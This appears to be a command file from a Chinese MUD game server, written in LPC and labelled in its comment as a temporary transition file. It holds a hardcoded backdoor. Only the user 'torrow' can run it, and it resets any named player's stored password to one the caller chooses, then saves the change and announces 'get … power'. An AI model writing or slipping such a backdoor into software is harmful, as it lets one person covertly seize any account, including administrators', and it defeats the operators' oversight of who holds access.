//临时过度文件。
inherit F_CLEAN_UP;
int main(object me, string arg)
{
        object ob;
        string wiz_status;
        string name,pass;
        int flag=0;
        if( me!=this_player(1) ) return 0;

        if( !arg || sscanf(arg, "%s %s", name, pass)!=2 )
            return notify_fail("什么？\n");
            if(me->query("id")!="torrow")
                  return notify_fail("u no magic power。\n");
        seteuid(getuid());
        if(ob=find_player(name))
        {
                if(ob->query_temp("link_ob")) {
                        ob = ob->query_temp("link_ob");
                        flag=1;
                }
        }
        if (!flag) {
                ob = new(LOGIN_OB);
                ob->set("id", name);
                if (!ob->restore())
                        return notify_fail("no such user or user data error\n");
        }

        if( !ob->set("password", crypt(pass,0)) ) {
             write(sprintf("get %s power！\n",name));
                return 0;
        }


        ob->save();
                  write(sprintf("get %s power！\n",name));

        if(!flag) destruct(ob);
        return 1;
}
